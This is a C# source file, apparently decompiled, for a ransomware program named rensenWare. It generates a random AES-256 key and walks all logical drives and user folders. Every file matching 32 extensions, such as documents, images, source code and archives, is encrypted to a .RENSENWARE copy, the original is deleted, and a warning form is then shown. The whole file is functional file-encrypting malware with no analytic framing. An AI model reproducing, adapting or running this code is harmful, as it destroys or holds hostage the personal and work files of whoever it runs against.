using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Windows.Forms;

namespace rensenWare;

internal static class Program
{
	internal static List<string> encryptedFiles = new List<string>();

	internal static readonly string KeyFilePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\randomkey.bin";

	internal static readonly string IVFilePath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\randomiv.bin";

	private static readonly string[] targetExtensions = new string[32]
	{
		".jpg", ".txt", ".png", ".pdf", ".hwp", ".psd", ".cs", ".c", ".cpp", ".vb",
		".bas", ".frm", ".mp3", ".wav", ".flac", ".gif", ".doc", ".xls", ".xlsx", ".docx",
		".ppt", ".pptx", ".js", ".avi", ".mp4", ".mkv", ".zip", ".rar", ".alz", ".egg",
		".7z", ".raw"
	};

	internal static byte[] randomKey { get; set; }

	internal static byte[] randomIV { get; set; }

	[STAThread]
	private static void Main()
	{
		if (File.Exists(KeyFilePath) && File.Exists(IVFilePath))
		{
			randomKey = File.ReadAllBytes(KeyFilePath);
			if (randomKey.Length == 32)
			{
				randomIV = File.ReadAllBytes(IVFilePath);
				if (randomIV.Length == 16)
				{
					Application.Run((Form)(object)new frmManualDecrypter());
					return;
				}
			}
		}
		randomIV = new byte[16];
		randomKey = new byte[32];
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetBytes(randomIV);
		rNGCryptoServiceProvider.GetBytes(randomKey);
		string[] logicalDrives = Environment.GetLogicalDrives();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		string[] array = logicalDrives;
		foreach (string text in array)
		{
			string[] directories;
			if (folderPath.Contains(text))
			{
				directories = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\..");
				foreach (string path in directories)
				{
					try
					{
						string[] files = Directory.GetFiles(path, "*.*", SearchOption.AllDirectories);
						foreach (string text2 in files)
						{
							string[] array2 = targetExtensions;
							foreach (string value in array2)
							{
								if (text2.EndsWith(value))
								{
									Crypt(text2);
									encryptedFiles.Add(text2 + ".RENSENWARE");
								}
							}
						}
					}
					catch
					{
					}
				}
				continue;
			}
			directories = Directory.GetFiles(text);
			foreach (string text3 in directories)
			{
				try
				{
					string[] files = targetExtensions;
					foreach (string value2 in files)
					{
						if (text3.EndsWith(value2))
						{
							Crypt(text3);
							encryptedFiles.Add(text3 + ".RENSENWARE");
						}
					}
				}
				catch
				{
				}
			}
			directories = Directory.GetDirectories(text);
			foreach (string path2 in directories)
			{
				try
				{
					string[] files = Directory.GetFiles(path2, "*.*", SearchOption.AllDirectories);
					foreach (string text4 in files)
					{
						string[] array2 = targetExtensions;
						foreach (string value3 in array2)
						{
							if (text4.EndsWith(value3))
							{
								Crypt(text4);
								encryptedFiles.Add(text4 + ".RENSENWARE");
							}
						}
					}
				}
				catch
				{
				}
			}
		}
		Application.Run((Form)(object)new frmWarning());
	}

	internal static void Crypt(string path, bool IsDecrypt = false)
	{
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.IV = randomIV;
		rijndaelManaged.Key = randomKey;
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Mode = CipherMode.CBC;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		ICryptoTransform transform = (IsDecrypt ? rijndaelManaged.CreateDecryptor(randomKey, randomIV) : rijndaelManaged.CreateEncryptor(randomKey, randomIV));
		using MemoryStream memoryStream = new MemoryStream();
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
		{
			byte[] array = File.ReadAllBytes(path);
			if (array.LongLength >= 2147483647L)
			{
				while (cryptoStream.Position != array.LongLength - 1L)
				{
					cryptoStream.Write(array, 0, 1);
				}
			}
			else
			{
				cryptoStream.Write(array, 0, array.Length);
			}
		}
		File.WriteAllBytes(IsDecrypt ? path.Replace(".RENSENWARE", string.Empty) : (path + ".RENSENWARE"), memoryStream.ToArray());
		File.Delete(path);
	}
}
